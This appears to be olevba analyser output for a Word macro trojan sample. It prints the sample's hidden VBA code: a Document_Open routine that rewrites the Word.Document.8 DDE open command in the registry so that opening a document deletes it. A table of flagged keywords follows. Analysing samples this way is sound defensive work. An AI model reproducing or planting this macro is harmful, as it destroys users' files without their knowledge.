olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Minus-a14c6dae7ce0c093f93bffdf1024000843bae8b3
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan.MSWord.Minus-a14c6dae7ce0c093f93bffdf1024000843bae8b3 
in file: Trojan.MSWord.Minus-a14c6dae7ce0c093f93bffdf1024000843bae8b3 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                    Private Sub Document_Open(): System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\Open\ddeexec", "") = "['DDE-Bacteria][On Error Resume Next][Kill(""%1"")]": End Sub 'VOVAN//SMF
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

